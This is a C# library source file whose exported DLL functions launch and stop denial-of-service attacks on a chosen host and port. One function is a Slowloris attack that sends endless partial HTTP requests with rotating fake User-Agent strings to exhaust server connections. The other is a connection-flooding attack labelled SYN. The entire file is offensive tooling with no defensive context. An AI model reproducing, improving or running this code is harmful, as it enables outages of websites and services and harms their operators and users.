using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CoreLibrary
{
    public class Core
    {

        public static bool SYN_Active { get; set; }
        public static bool Slowloris_Active { get; set; }

        [DllExport]
        public static void Slowloris_Attack_Stop()
        {
            Slowloris_Active = false;
        }

        [DllExport]
        public static void SYN_Attack_Stop()
        {
            SYN_Active = false;
        }

        [DllExport]
        public static void Slowloris_Attack_Start([MarshalAs(UnmanagedType.LPWStr)]String host, int port, int timeout)
        {
            ThreadPool.QueueUserWorkItem((e) =>
            {
                while (Slowloris_Active)
                {
                    Socket slowSocket = null;

                    try
                    {
                        slowSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        slowSocket.Connect(host, port);
                        slowSocket.Send(GenerateRequest(host));
                        while (slowSocket.Connected && Slowloris_Active)
                        {
                            slowSocket.Send(GenerateRequest(host));
                            Thread.Sleep(2000);
                        }
                    }
                    catch
                    {
                        slowSocket.Close();
                        slowSocket = null;
                    }
                    Thread.Sleep(timeout);
                    break;
                }

                if (Slowloris_Active)
                    Slowloris_Active = false;

            });
        }



        [DllExport]
         public static void SYN_Attack_Start([MarshalAs(UnmanagedType.LPWStr)]String host, int port, int timeout)
        {
            ThreadPool.QueueUserWorkItem((e) =>
            {           
                while (SYN_Active)
                {
                            Socket synSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            synSocket.Blocking = false;
                            try
                            {
                                synSocket.BeginConnect(host, port, new AsyncCallback(onConnect), null);
                            }
                            catch
                            {

                            }

                            Thread.Sleep(100);

                            try
                            {
                                if (synSocket.Connected)
                                {
                                    synSocket.Disconnect(false);
                                }
                                synSocket.Close();
                                synSocket = null;
                            }
                            catch 
                            {
                        
                            }
                            Thread.Sleep(timeout);

               }

                if (SYN_Active)
                    SYN_Active = false;

            });
        }

        static void onConnect(IAsyncResult ar)
        {
        }



        static byte[] GenerateRequest(string host)
        {
            Random r = new Random();
            StringBuilder req = new StringBuilder();
            req.AppendLine("GET / HTTP/1.1");
            req.AppendLine("Host: " + host);
            req.AppendLine("User-Agent: " +browsers[r.Next(0, browsers.Length - 1)]  + " " + userAgents[r.Next(0, userAgents.Length - 1)]);
            req.AppendLine("Content-Length: " + r.Next(1, 1000).ToString());
            req.AppendLine("X-a: " + r.Next(1, 10000).ToString());
            req.Append("Connection: keep-alive");
            return Encoding.ASCII.GetBytes(req.ToString());
        }
        static string[] userAgents = new string[] 
        {
        "(compatible; MSIE 6.0; Windows NT)",
        "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
        "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
        "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
        "[en] (WinNT; U)",
        "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
        "(compatible; MSIE 6.0; Win32)",
        "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
        "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
        "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
        "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
        "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
        "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
        "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
        "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
        "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
        "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
        "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
        "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
        "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
        "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
        "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
        "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
        "(compatible; MSIE 6.1; Windows XP)",
         "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
        }; 

        static string[] browsers = new string[]
        {
                "Mozilla/3.0 ",
                "Mozilla/3.1 ",
                "Mozilla/3.6 ",
                "Mozilla/4.0 ",
                "Mozilla/4.08 ",
                "Mozilla/5.0 ",
                "Opera/9.33 ",
                "Opera/9.0 ",
                "Opera/8.90 ",
                "Opera/9.80 "
        };

        // Example with returning string
        /* [DllExport]
         [return: MarshalAs(UnmanagedType.LPWStr)]
         public static string TEST([MarshalAs(UnmanagedType.LPWStr)]String host, int port, int timeout)
         {
             return String.Format("HOST = {0} and PORT = {1} and TIMEOUT = {2}", host, port, timeout.ToString());
         }*/
    }
}
